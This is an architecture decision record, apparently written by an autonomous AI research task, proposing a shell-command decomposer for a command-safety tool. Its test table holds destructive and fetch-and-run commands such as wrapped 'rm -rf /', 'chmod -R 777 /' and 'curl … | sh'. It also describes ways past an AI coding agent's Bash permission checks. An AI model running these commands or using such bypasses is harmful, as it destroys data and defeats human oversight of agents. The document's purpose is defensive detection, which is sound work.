# ADR-067: `caro.decompose.v1` — Enumerate Every Execution Site in a Command Before Judging Any of Them

- **Status**: Proposed (implementation ADR — buildable on the tree that exists today, not on the
  paper stack)
- **Date**: 2026-09-08
- **Produced by**: `caro-research--scoping-process` scheduled task (autonomous run, no user present)
- **Feature researched**: **Claude Code's Bash permission matcher** — specifically the
  *subcommand-splitting* layer documented at
  [code.claude.com/docs/en/permissions](https://code.claude.com/docs/en/permissions): Claude Code
  splits a compound command on `&&`, `||`, `;`, `|`, `|&`, `&` and newlines and requires every
  subcommand to match a rule on its own, and it descends into subshells, command substitutions and
  control-flow bodies when applying `deny` and `ask` rules. Read 2026-09-08.
- **Failure-mode corpus** (all read 2026-09-08, all from the last seven days of the host's own
  changelog at [code.claude.com/docs/en/changelog](https://code.claude.com/docs/en/changelog)):
  - **v2.1.260 (2026-09-03)** — "Fixed Bash permission checks auto-approving zsh commands that
    hide a command substitution in a `REPORTTIME`, `REPORTMEMORY` or `DIRSTACKSIZE` assignment;
    these now prompt for approval." A dialect-specific evaluation site the splitter did not model.
  - **v2.1.261 (2026-09-04)** — "Improved the dangerous-`rm` safety prompt to also catch `rm -rf`
    on positional parameters and inside double-quoted `sh -c` scripts." The nested-interpreter site
    and the indirection site, fixed *per pattern* (`rm`) rather than structurally.
  - **v2.1.259 (2026-09-02)** — "Fixed Bash `Read()` deny rules not covering files given as option
    values (`--ignore-revs-file=.env`, `-f.env`, `@file`), `git diff`/`git grep` file operands, or
    `cd DIR && cat FILE` compounds." Operand-position blindness inside a site that *was* found.
  - **v2.1.260 (2026-09-03)** — "Reverted the 2.1.259 change applying `Read()` deny rules to Bash
    arguments; it denied `npm run build` under a `Read(./**/build/**)` rule in every mode." The
    false-positive whiplash that follows from bolting argument analysis onto a matcher that has no
    structural model of what an argument *is*.
  - Documented-by-design limits: argument-constraining Bash patterns are called fragile in the docs
    (`Bash(curl http://github.com/ *)` does not do what it looks like it does), and a command with a
    dangling operator (`npm test &&`) is treated as unparseable and is not split at all.
- **Failure mode found in Caro itself** (this is the load-bearing finding; see Context §3):
  `SafetyValidator::is_dangerous_in_context` (`src/safety/mod.rs:426-452`) suppresses any pattern
  match preceded by an odd number of unescaped quotes. Replaying the built-in pattern table against
  a thirteen-row corpus under that exact algorithm, **eight rows that must be dangerous come back
  clean**, including `sh -c "rm -rf /"`, `eval "rm -rf /"`, `sudo sh -c "chmod -R 777 /"` and
  `echo "it's fine" ; rm -rf /`. Caro ships the same class of bug the host spent three releases
  patching, and ships it in the one subsystem the product is named for.
- **Depends on**: nothing unlanded. `RiskLevel`, `SuggestedRouting`, `SafetyLevel`, `ShellType`,
  `SafetyValidator`, `ValidationResult`, `clap`, `serde`, `schemars` and `assert_cmd` all ship in
  1.4.0. No filesystem I/O, no network, no daemon, no new crate, no new top-level module.
- **Relates to**: ADR-066 (`caro.confinement.v1` — its v1 answers `Indeterminate { Composed }` the
  moment a command has more than one segment; this ADR is the primitive that dissolves that
  answer, and D6 below commits the two to one shared scanner rather than two parsers),
  ADR-064 (`caro.egress.v1` — a `curl … | sh` pipeline is two sites, and 064's source→sink axis
  needs the site list to say which side is which), ADR-063 (`caro.bench.v1` — the differential
  corpus in §5 of the scope doc is a benchmark row set), ADR-007 (shell AST — deliberately **not**
  depended on; see D5).
- **Does not depend on**: ADR-024, ADR-058/059, ADR-060, ADR-065, ADR-066. All are paper as of this
  date; `src/safety/` still contains only `mod.rs`, `patterns.rs` and `cve_patterns.rs`.
- **Full scope document**: `caro-scope-execution-sites-2026-09-08.md`
- **Numbering note**: highest existing is ADR-066. Per `.claude/rules/adr-numbering.md`, renumber on
  merge if another 067 lands first.

---

> **Provenance note (autonomous run).** The task template left `[FEATURE NAME]` unbound and ran with
> no user present, so target selection was mine. Rationale: three of the last five Claude Code
> releases carry a fix in the same place — the boundary between *the text of a shell command* and
> *the set of things that command will actually execute*. That is not a run of unrelated bugs; it is
> one missing abstraction surfacing five times. Caro's entire product sits on that boundary, and a
> ten-minute replay of Caro's own context filter against the same inputs shows Caro is further
> behind on it than the host is. Every other candidate in the same window (`experimental.cacheTtl`,
> `bashOutputMaxChars`, `--append-subagent-system-prompt-file`, `/skill-doctor`) is host
> ergonomics with no safety surface.
>
> **Moratorium note.** ADR-059 declared itself "the last ADR in this space until
> `src/safety/assessment.rs` merges." Re-verified 2026-09-08: it has not merged (`src/assessment/`
> is still the hardware recommender, and `Commands::Assess` is still a commented-out block at
> `src/main.rs:422-434`). This ADR mints no policy vocabulary, no approval exchange, no lifecycle
> event and no new routing tier. It reuses `RiskLevel`, `SafetyLevel` and `SuggestedRouting`
> unchanged, and it reuses `SafetyValidator` rather than re-implementing matching. It mints one
> report struct and the site vocabulary that struct needs. D6 commits it to nesting inside
> `caro.assessment.v1` when that lands.

---

## Context

### 1. What the host actually models

Claude Code's Bash matcher is better than its reputation. It is not a prefix match on a string. It
splits the command on the seven separators, requires each subcommand to satisfy an `allow` rule
independently, and — for `deny` and `ask` — descends into subshells, command substitutions and
control-flow bodies, so `echo "$(git clean -f)"` still prompts under `Bash(git clean *)`. That is a
real structural model and it is the part worth copying.

What it does not have is a model of the **interpreter argument**. When the head of a subcommand is
itself a shell, the string it is handed is a program, not an operand — and the matcher treats it as
an operand. The v2.1.261 note is the tell: the fix for `rm -rf` inside a double-quoted `sh -c`
script landed in the *dangerous-`rm` safety prompt*, a per-pattern heuristic, not in the splitter.
`sh -c "chmod -R 777 /"` is a different pattern and therefore a different fix.

It also has no model of **dialect-specific evaluation**. zsh coerces `REPORTTIME`, `REPORTMEMORY`
and `DIRSTACKSIZE` assignments to integers, which evaluates a `$(…)` on their right-hand side even
though the statement reads as inert. The splitter treated the whole thing as an assignment and
auto-approved it (v2.1.260). There is no reason to believe that list is closed; it is a list of the
three variables someone reported.

And it has no model of **irrecoverable text**. `npm test &&` is "unparseable" and is simply not
split. `rm -rf "$@"` names a program whose operands do not exist until runtime. In both cases the
matcher's answer is structurally an absence — no rule matched — and an absence is indistinguishable
downstream from a clean result.

### 2. Why these are one failure, not five

Each of the five corpus entries is the same shape: **a region of the input that will be executed,
which the matcher classified as something other than a region that will be executed.** Quoted
interpreter script, assignment right-hand side, option value, positional parameter, dangling
operator. The fixes were five point patches because the architecture has nowhere to put the general
statement. There is no artifact anywhere in the system that says "this command has N execution
sites, here they are, and here is the one I could not read."

That artifact is the missing abstraction, and it is a natural product for a standalone tool.

### 3. What Caro does today — and why it is worse

Caro's `SafetyValidator` runs its regex table against the flat command string, with one filter
(`src/safety/mod.rs:426-452`) intended to keep `echo 'rm -rf /' > script.sh` from tripping the
`rm -rf /` pattern. The filter counts unescaped quotes before each match and discards the match if
the count is odd.

The filter asks *"is this text quoted?"* The question that matters is *"will this text be
executed?"* Those coincide for the one example in the doc comment and diverge everywhere else.
Replaying the algorithm against the shipped pattern strings:

| Input | Caro today | Correct |
|---|---|---|
| `rm -rf /` | dangerous | dangerous |
| `sh -c "rm -rf /"` | **clean** | dangerous |
| `bash -c 'rm -rf /'` | **clean** | dangerous |
| `eval "rm -rf /"` | **clean** | dangerous |
| `xargs sh -c "rm -rf /"` | **clean** | dangerous |
| `find . -exec sh -c "rm -rf /" \;` | **clean** | dangerous |
| `ssh host "rm -rf /"` | **clean** | dangerous |
| `sh -c "curl https://x.sh \| sh"` | **clean** | dangerous |
| `sudo sh -c "chmod -R 777 /"` | **clean** | dangerous |
| `echo "it's fine" ; rm -rf /` | **clean** | dangerous |
| `echo "hello" && rm -rf /` | dangerous | dangerous |
| `curl https://x.sh \| sh` | dangerous | dangerous |
| `echo 'rm -rf /' > script.sh` | clean | clean |

Ten of thirteen rows are dangerous; Caro reports four of them. The last row is the one the filter
was written for, and it is the only thing the filter earns. Note the second-to-last miss: a stray
apostrophe *anywhere earlier in the line* silently disarms every later pattern, which makes the
suppression not merely incomplete but attacker-controllable with a single character.

The critical-built-in pre-scan that protects the allowlist (`src/safety/mod.rs:483-495`) runs
through the same filter, so it inherits the same holes: the guarantee that "`rm -rf /` is dangerous
regardless of what's in `patterns.toml`" does not survive being written as `sh -c "rm -rf /"`. The
allowlist loop itself is worse — it calls `regex.is_match(command)` on the raw string with no
context check at all, so an allowlist entry can be satisfied by text inside a quoted region that
never executes.

`src/safety/` has three files and no notion of a command's structure. ADR-066's `caro confine`
concedes the same ground from the other direction: its v1 answers `Indeterminate { Composed }` for
anything with a `cd … && …` in it, because it has no segmentation primitive either.

### 4. What is actually being asked for

Not a shell. Not an AST (ADR-007, still paper). The narrow thing every one of the five host bugs
needed, and the thing Caro's filter needed and did not have: **an ordered, serialized enumeration of
the regions of an input that will be evaluated as a program, with the recovered text of each region
where recovery is possible from the input alone, and an explicit, typed statement of irrecoverability
where it is not.**

Once that exists, the existing validator runs per site and every one of the ten rows above resolves
correctly without a single new pattern being written.

## Decision

Add one subprocess verb, `caro decompose`, and one supporting module, `src/safety/decompose.rs`,
that together implement the enumeration above and emit it as `caro.decompose.v1`. Rewrite
`SafetyValidator::is_dangerous_in_context` to consume that enumeration instead of counting quotes.

Eight decisions carry the design.

**D1 — Total coverage is an invariant, and it is in the payload.** Every byte of the input is
attributed either to an execution site or to a non-executable span with a stated reason. The report
carries a `coverage` object naming `input_bytes`, `attributed_bytes` and any `unattributed` spans.
A report with a non-empty `unattributed` list may not carry a `Clear` verdict. This is the direct
negation of the current filter, whose entire mechanism is *dropping* text: text is never dropped,
it is classified. Silent suppression becomes structurally unrepresentable rather than merely
discouraged.

**D2 — Unrecoverable text is a site, not an absence.** `rm -rf "$@"`, `echo <b64> | base64 -d | sh`,
`. ./setup.sh`, `$INTERP -c "…"`, and a command that exceeds the depth cap all produce a site whose
`recovery` is `Opaque { reason }` and whose `text` is `null`. An `Opaque` site is never validated
and therefore never contributes a clean result; it forces the verdict to `Opaque` and, at
`--safety strict`, exit 2. This is the answer to `npm test &&` and to `rm -rf $1`: the host's
matcher renders "I could not read this" as "nothing matched", which is a fail-open by omission.
Caro renders it as a typed field a consumer must handle.

**D3 — The interpreter set is data, and it is closed and published.** A quoted string becomes a
site only when it is the script operand of a head in a fixed, enumerated set (`sh`/`bash`/`zsh`/
`dash`/`ksh` with `-c`, `eval`, `su -c`, `sudo` + interpreter, `ssh` + remote command, `xargs`
+ interpreter, `find -exec` + interpreter, `env` + interpreter, `nohup`/`timeout`/`nice` + the
above, `docker`/`podman run … sh -c`, `kubectl exec … -- sh -c`). A quoted string under any other
head is data and is *not* scanned. This is what preserves `echo 'rm -rf /' > script.sh`: the filter
the current code is trying to be, expressed as a property of the head rather than a property of the
quoting. It is also why this is not the v2.1.259 argument-scanning mistake that had to be reverted
a day later — the rule keys on the head being an interpreter, not on the argument looking like a
path.

**D4 — Dialect-conditional sites are declared per `ShellType`.** The zsh special-integer
assignments (`REPORTTIME`, `REPORTMEMORY`, `DIRSTACKSIZE`, `SAVEHIST`, `LISTMAX`, `KEYTIMEOUT`,
`TMOUT`) yield an `AssignmentValue` site only under `ShellType::Zsh`. Every table in the module is
keyed by dialect, and `ShellType::Unknown` takes the **union** of all dialects' sites — under an
unknown shell the safe answer is more sites, not fewer. The host shipped the zsh case as a bug fix
against a dialect-blind matcher; Caro's table has a column for it on day one, and a
`ShellType::PowerShell`/`Cmd` input yields exactly one site, `TopLevel`, with `Opaque { reason:
UnsupportedDialect }` rather than a POSIX answer about a non-POSIX shell.

**D5 — Lexical, bounded, no AST.** The scanner is a single-pass quote/nesting state machine with a
depth cap of 8 and a site cap of 256, both serialized in the report and both surfaced as
`truncated: true` plus an `Opaque { NestingLimit }` site when hit. It does not implement expansion,
word splitting, aliases, functions or control flow beyond recognising their bodies as sites. ADR-007
is not a dependency and this ADR does not become one for it: when a real AST lands, `decompose`
becomes a projection of it and the report shape does not change.

**D6 — One scanner, two consumers.** The segmentation primitive
(`decompose::sites(command, shell, limits)`) is public within the crate, and ADR-066's `confine`
consumes it to retire its `Indeterminate { Composed }` answer rather than growing a second parser.
The two verbs stay separate — placement and reachability are different questions — but there is
exactly one thing in the tree that knows where a `&&` is. When `caro.assessment.v1` lands,
`DecompositionReport` nests under it as an optional member; it does not become a peer envelope.

**D7 — The rewrite of the existing filter ships in the same PR, gated by a differential corpus.**
Shipping the verb while leaving `is_dangerous_in_context` counting quotes would mean Caro publishes
a tool that finds the bug it still has. `is_dangerous_in_context` becomes: for each recovered site,
match the regex against that site's text; return true on the first hit. The behavioural delta is
exactly the thirteen-row table in Context §3 plus the corpus in the scope document, and the gate is
that `tests/cve_enforcement.rs`, `tests/beta_regression.rs`, `tests/custom_patterns_toml.rs` and
`tests/property_tests.rs` stay green unchanged. The allowlist loop gains the same treatment: an
allowlist pattern must match at a site, not anywhere in the string.

**D8 — Advisory verb, inherited exit convention.** `caro decompose` is additive: nothing in the
generation or execution path calls it. Exit codes follow ADR-065/066 — `0` clean or indeterminate,
`2` finding, and `2` for indeterminate at `--safety strict`. The known wart in that convention
(clap emits `2` for usage errors) is inherited deliberately rather than forked; machine consumers
key on `verdict` in the payload and use the exit code as the shell-friendly shortcut. §4 of the
scope document specifies the disambiguation.

## Rationale

The five host fixes cost five releases and produced one revert because each was a patch to a
matcher with no place to state the general rule. The general rule is cheap to state once you accept
that the artifact — the site list — is the product rather than an implementation detail. Caro is a
subprocess with no session, no conversation and no tool namespace to protect, which means it can
publish the intermediate artifact that an integrated agent has no natural surface for. A host that
wants this today has to infer it from an approval prompt.

Doing it this way also converts Caro's own worst bug into a scoped, testable deletion. The current
filter is thirty lines with a doc comment that lists its own limitations and calls them "rare in
practice"; the replay says eight of thirteen. Replacing it with a per-site match is a smaller
function, not a larger one.

## Consequences

### Benefits

- Ten of the thirteen Context §3 rows resolve correctly with zero new patterns. The existing 52+
  pattern table gets substantially more reach from a change that touches no pattern.
- The critical-built-in pre-scan's stated guarantee — that a `patterns.toml` allowlist cannot
  re-enable `rm -rf /` — becomes true for the wrapped forms it is currently false for.
- `Opaque` gives agent builders something the host cannot currently give them: a machine-readable
  "there is a program here I cannot read", distinguishable from "nothing matched".
- ADR-066 loses its largest indeterminacy class without shipping a second parser.
- The verb works offline, with no daemon and no state, against any agent's proposed command,
  including agents that are not Claude Code.

### Trade-offs

- New false positives are possible where the old filter suppressed a true positive that a user had
  learned to rely on being quiet. The differential corpus is the mitigation and the acceptance
  gate; §5 of the scope document enumerates the delta row by row rather than asserting there is
  none.
- Byte-span bookkeeping across nesting levels is the fiddliest part of the module and is where a
  coverage bug would hide. D1 makes that failure loud — an accounting error shows up as a
  non-empty `unattributed` list, which downgrades the verdict — rather than silent.
- A lexical scanner will over-report on pathological input (a heredoc containing shell-looking
  text under an interpreter head). Over-reporting is the correct direction for a safety tool, and
  `--safety permissive` plus the per-site payload gives a consumer the information to disagree.

### Risks

- **Risk**: the interpreter set (D3) is incomplete on day one, so some wrapper still hides a site.
  → **Mitigation**: the set is a published table in one file with a documented extension path, and
  an unrecognised head that *looks* like an interpreter invocation (`-c` flag with a single string
  operand) yields `Opaque { UnknownInterpreter }` rather than silence.
- **Risk**: the rewrite regresses a shipped behaviour that a downstream consumer depends on.
  → **Mitigation**: D7's four-suite green gate, plus the differential corpus as an explicit,
  reviewable list of every changed answer.
- **Risk**: `Opaque` becomes noise — most real commands contain a `$VAR` somewhere and every report
  ends up indeterminate. → **Mitigation**: opacity is scoped to the *site*, not the command. A
  `$VAR` in an operand position does not make a site opaque; only a `$VAR` that determines what is
  executed does. §3 of the scope document draws that line with the corpus.
- **Risk**: scope creep toward "Caro implements a shell". → **Mitigation**: D5's caps are numeric,
  serialized and tested; anything requiring expansion semantics is in the out-of-scope list.

## Alternatives considered

### Alternative 1: Extend the pattern table with wrapped variants

Add `sh\s+-c\s+["']rm\s+-rf\s+/` and its siblings to `patterns.rs`.

- **Pros**: no new module, no new verb, lands in an afternoon.
- **Cons**: this is exactly the v2.1.261 fix, and it is why `sudo sh -c "chmod -R 777 /"` was still
  open after it. The wrapper set and the pattern set multiply; 52 patterns times a dozen wrappers
  times two quote styles is a table nobody maintains, and it still does nothing for a wrapper
  nobody enumerated. Rejected as the failure mode restated.

### Alternative 2: Fix the quote counter

Make `is_dangerous_in_context` handle nested quotes, escapes and hex escapes properly.

- **Pros**: smallest diff; addresses the `echo "it's fine" ; rm -rf /` row.
- **Cons**: addresses exactly that one row. A *correct* quote counter still reports
  `sh -c "rm -rf /"` clean, because the text genuinely is quoted — the premise is wrong, not the
  arithmetic. Rejected.

### Alternative 3: Shell out to `bash -n` / use a real parser crate

Delegate structure to the shell itself or to a `conch-parser`-class dependency.

- **Pros**: real grammar coverage; no hand-rolled state machine.
- **Cons**: `bash -n` requires the dialect to be installed and runs the shell on attacker-supplied
  text, which is the opposite of what a safety tool should do, and it says nothing about zsh
  dialect sites. A parser crate is a new dependency subject to `.claude/rules/external-sdk-integration.md`
  (build-spike PR first), gives an AST that this feature does not need, and would not have caught
  the zsh assignment case either, since that is a semantic rule rather than a grammatical one.
  Deferred, not rejected: D5 keeps the seam open.

### Alternative 4: Ship the verb, leave the validator alone

Make `decompose` purely advisory and defer the `is_dangerous_in_context` rewrite to a follow-up.

- **Pros**: zero regression risk in the shipped path; smaller review.
- **Cons**: Caro would ship a tool that diagnoses a bug Caro still has, and the eight false
  negatives would stay live behind a verb almost nobody runs. Rejected on D7; the differential
  corpus is what makes the combined PR reviewable.

### Alternative 5: Model this as a new `RiskLevel` tier or routing verdict

Add a `Hidden`/`Wrapped` tier so wrapped danger is distinguishable in existing payloads.

- **Pros**: no new report struct.
- **Cons**: violates the ADR-059 moratorium, and it is the wrong axis anyway — the site is where
  the danger is, and the risk of the site is the risk it already has. Rejected.

## Implementation Notes

Two new files, four edited. Full detail in `caro-scope-execution-sites-2026-09-08.md`:

- `src/models/mod.rs` — `SiteKind`, `Recovery`, `OpacityReason`, `Span`, `Site`, `SiteValidation`,
  `Coverage`, `DecompositionVerdict`, `DecompositionReport`. All `Serialize + Deserialize +
  JsonSchema` from the first commit; enums `#[serde(rename_all = "snake_case")]` and
  `#[non_exhaustive]`.
- `src/safety/decompose.rs` — **new.** The state machine, the dialect-keyed interpreter and
  assignment tables, `sites()` and `report()`.
- `src/safety/mod.rs` — `pub mod decompose;`, the `is_dangerous_in_context` rewrite (D7), the
  allowlist site-scoping.
- `src/main.rs` — `Commands::Decompose`, dispatch arm, `EXIT_CODE_DECOMPOSITION_FINDING`.
- `src/cli/mod.rs` — optional `decomposition` member on `CliResult`.
- `tests/decomposition_contract.rs` — **new.** The 24-row deterministic corpus.

Rollout: additive verb plus a gated rewrite, one PR, feature-branch per
`.claude/rules/git-workflow.md`. Revert is a five-file revert; the verb has no persisted state and
no config key.

## Success Metrics

- **Coverage**: all 24 corpus rows in scope §5 produce byte-exact payloads and exit codes.
- **Recall delta**: the ten dangerous rows of Context §3 go from 4/10 detected to 10/10, measured by
  a test that asserts both the before and after answers.
- **No regression**: `cve_enforcement.rs`, `beta_regression.rs`, `custom_patterns_toml.rs` and
  `property_tests.rs` pass unchanged.
- **Invariant**: a property test over generated inputs finds no case where `coverage.unattributed`
  is non-empty while `verdict` is `Clear`.
- **Latency**: p99 under 1 ms for commands up to 4 KiB, keeping the verb inside ADR-062's hook
  budget.

## Business Implications

The site list is the artifact an agent-governance buyer asks for after an incident — "what was
actually going to run" — and it is the artifact no integrated agent currently emits, because for
them it is an internal step of a permission prompt. Publishing it as a stable, versioned payload
from a standalone binary that runs offline against any agent's output is a positioning that a
host-integrated matcher cannot copy without changing what it is. It also makes Caro's existing
pattern table meaningfully better without adding a pattern, which is the cheapest credibility gain
available in the current tree.

## References

- [Claude Code changelog](https://code.claude.com/docs/en/changelog) — v2.1.259 (2026-09-02),
  v2.1.260 (2026-09-03), v2.1.261 (2026-09-04); read 2026-09-08
- [Configure permissions — Claude Code Docs](https://code.claude.com/docs/en/permissions) —
  subcommand splitting, the seven separators, deny/ask descent into substitutions, the documented
  fragility of argument-constraining patterns
- [anthropics/claude-code#4956](https://github.com/anthropics/claude-code/issues/4956) — Bash
  permission bypass via command chaining
- [anthropics/claude-code#28784](https://github.com/anthropics/claude-code/issues/28784) —
  `Bash(cd:*)` allowing arbitrary execution via `&&` chaining
- [anthropics/claude-code#20254](https://github.com/anthropics/claude-code/issues/20254) — docs
  issue requesting stronger guidance on Bash pattern limitations
- Caro: `src/safety/mod.rs:426-452` (`is_dangerous_in_context`), `:483-495` (critical pre-scan),
  `:496-511` (allowlist loop), `src/safety/patterns.rs` (the 52+ table)
- Related ADRs: ADR-066, ADR-064, ADR-063, ADR-062, ADR-059, ADR-007
- Project rules: `.claude/rules/constitution.md`, `.claude/rules/adr-numbering.md`,
  `.claude/rules/validation-discipline.md`, `.claude/rules/external-sdk-integration.md`

## Revision History

| Date | Author | Changes |
|------|--------|---------|
| 2026-09-08 | `caro-research--scoping-process` (autonomous) | Initial draft |
